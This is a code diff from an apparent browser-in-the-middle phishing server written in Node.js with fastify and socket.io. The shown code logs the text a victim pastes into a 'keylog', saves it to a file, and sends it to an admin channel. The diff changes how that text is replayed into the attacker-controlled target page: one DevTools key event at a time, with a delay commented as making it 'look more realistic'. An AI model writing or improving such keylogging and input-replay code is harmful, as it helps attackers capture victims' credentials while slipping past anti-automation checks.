@@ -451,9 +451,25 @@ fastify.ready(async function(err){
           console.log(`Paste: ${paste_data}`)
           browser.keylog = browser.keylog + paste_data
           browser.keylog_file.write(paste_data)
-          fastify.io.to('admin_room').emit('keylog', socket.id, browser.keylog)
+          fastify.io.to('admin_room').emit('keylog', browser.browser_id, browser.keylog)
         }
-        await browser.target_page.keyboard.type(paste_data)
+        
+        // Use character-by-character input with CDP to match individual keystroke behavior
+        for(let i = 0; i < paste_data.length; i++){
+          const char = paste_data[i]
+          await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            type: 'keyDown',
+            key: char,
+            text: char,
+          })
+          await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            type: 'keyUp', 
+            key: char,
+            text: char,
+          })
+          // Small delay to make it look more realistic (optional, can be removed for speed)
+          await new Promise(resolve => setTimeout(resolve, 10))
+        }
       }
     })
     socket.on("keydown", async function(key){
